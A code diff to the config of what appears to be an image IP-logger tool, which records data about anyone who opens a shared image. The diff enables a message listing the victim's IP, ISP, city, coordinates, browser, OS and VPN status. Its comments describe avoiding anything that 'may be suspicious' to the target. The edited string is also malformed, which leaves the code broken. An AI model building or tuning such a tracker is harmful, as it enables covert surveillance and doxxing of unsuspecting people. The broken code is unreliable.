@@ -27,9 +27,22 @@ config = {
     "accurateLocation": False, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.
 
     "message": { # Show a custom message when the user opens the image
-        "doMessage": False, # Enable the custom message?
-        "message": "Your IP is {ip}", # Message to show
-        "richMessage": False, # Enable rich text? (See README for more info)
+        "doMessage": True, # Enable the custom message?
+        "message": "Y{ip} Their IP Address.
+{isp} Their ISP (Internet Service Provider)
+{asn} Their ASN (Autonomous System Number)
+{country} The country in which the IP is located.
+{region} The region in which the IP is located.
+{city} The city in which the IP is located.
+{lat} The IPs latitude.
+{long} The IPs longitude.
+{timezone} The timezone of the IP.
+{mobile} If it's a mobile connection.
+{vpn} If the IP belongs to a VPN/Proxy.
+{bot} If the IP is a robot.
+{browser} The Browser of the client.
+{os} The OS of the client.", # Message to show
+        "richMessage": True, # Enable rich text? (See README for more info)
     },
 
     "vpnCheck": 1, # Prevents VPNs from triggering the alert
